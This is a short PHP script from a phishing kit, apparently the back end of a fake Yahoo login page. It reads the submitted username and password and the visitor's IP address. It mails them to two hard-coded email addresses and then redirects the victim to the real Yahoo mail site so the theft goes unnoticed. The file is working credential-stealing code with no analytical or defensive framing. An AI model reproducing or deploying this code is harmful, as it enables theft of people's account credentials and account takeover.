<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------Yahoo Spam Arabo-----------------------\n";
$message .= "User Name : ".$_POST['login']."\n";
$message .= "Password : ".$_POST['passwd']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created zeun------------------------------\n";

$recipient = "kelvinbanks230@yahoo.com,medinaramon065@gmail.com";
$subject = "Yahoo!";
$headers = "From Arabo";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "Yahoo Spam ReZulT (Arab)", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: http://mail.yahoo.com/");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>